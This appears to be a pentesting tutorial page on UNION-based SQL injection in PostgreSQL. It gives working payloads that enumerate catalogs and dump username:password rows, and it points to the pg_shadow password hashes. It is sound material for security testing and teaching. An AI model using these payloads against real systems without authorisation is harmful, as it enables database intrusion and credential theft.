---
title: "Extracting PostgreSQL schema and data with UNION"
description: "Enumerating databases, tables, and columns in PostgreSQL through information_schema and pg_catalog, then dumping rows with string_agg."
keywords:
  - information_schema
  - pg_catalog
  - string_agg
  - pg_tables
  - column enumeration
---

# Extract schema and data

With a reflected text column found, PostgreSQL's catalogs map the server and `string_agg()` packs many rows into the single cell. The examples assume a three-column query with the second column reflected.

List databases from the native catalog:

```sql
' UNION SELECT NULL,string_agg(datname,','),NULL FROM pg_database-- 
```

List tables in the current database. The `table_schema='public'` filter keeps results to the application's own schema rather than system tables:

```sql
' UNION SELECT NULL,string_agg(table_name,','),NULL FROM information_schema.tables WHERE table_schema='public'-- 
```

List the columns of a target table, constrained to the schema so identically named tables in other schemas do not merge:

```sql
' UNION SELECT NULL,string_agg(column_name,','),NULL FROM information_schema.columns WHERE table_name='users' AND table_schema='public'-- 
```

Dump the rows, casting to `text` and joining fields with a delimiter:

```sql
' UNION SELECT NULL,string_agg(username||':'||password,E'\n'),NULL FROM users-- 
```

When `information_schema` is filtered, `pg_catalog` gives the same data under different names: `pg_tables` lists tables, `pg_namespace` lists schemas, and `pg_attribute` joined to `pg_class` lists columns. The credential store itself is `pg_shadow` (or `pg_authid`), readable only by a superuser, which holds role password hashes.

## Tools

- **sqlmap**: automated union extraction walking information_schema and pg_catalog.
- **psql**: official client to confirm catalog queries directly.

## References

- PostgreSQL Documentation: `information_schema`, system catalogs, `string_agg`
- OWASP Testing Guide: Testing for SQL Injection
